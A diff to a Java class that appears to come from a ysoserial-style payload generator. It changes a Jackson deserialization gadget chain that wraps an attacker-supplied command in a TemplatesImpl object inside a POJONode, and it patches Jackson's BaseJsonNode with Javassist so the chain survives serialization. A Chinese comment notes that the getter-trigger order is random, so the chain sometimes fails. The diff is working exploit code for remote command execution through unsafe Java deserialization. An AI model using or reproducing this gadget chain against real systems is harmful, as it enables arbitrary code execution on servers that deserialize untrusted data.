@@ -10,26 +10,22 @@ import javassist.CtMethod;
 import javax.management.BadAttributeValueExpException;
 import java.util.HashMap;
 
-
-public class Jackson implements ObjectPayload<Object> {
+// 在触发 getter 的时候是以随机顺序触发的,所以概率打空
+public class Jackson1 implements ObjectPayload<Object> {
 
     @Override
     public Object getObject(String command) throws Exception {
         final Object template;
         template = Gadgets.createTemplatesImpl(command);
 
-        ClassPool pool = ClassPool.getDefault();
-        //pool.insertClassPath(new ClassClassPath(Class.forName("com.fasterxml.jackson.databind.node.BaseJsonNode")));
         try {
-            CtClass  ctClass      = pool.get("com.fasterxml.jackson.databind.node.BaseJsonNode");
+            CtClass ctClass = ClassPool.getDefault().get("com.fasterxml.jackson.databind.node.BaseJsonNode");
             CtMethod writeReplace = ctClass.getDeclaredMethod("writeReplace");
             ctClass.removeMethod(writeReplace);
-            // 将修改后的CtClass加载至当前线程的上下文类加载器中
             ctClass.toClass();
         } catch (Exception EE) {
 
         }
-
 
         POJONode node = new POJONode(template);
 
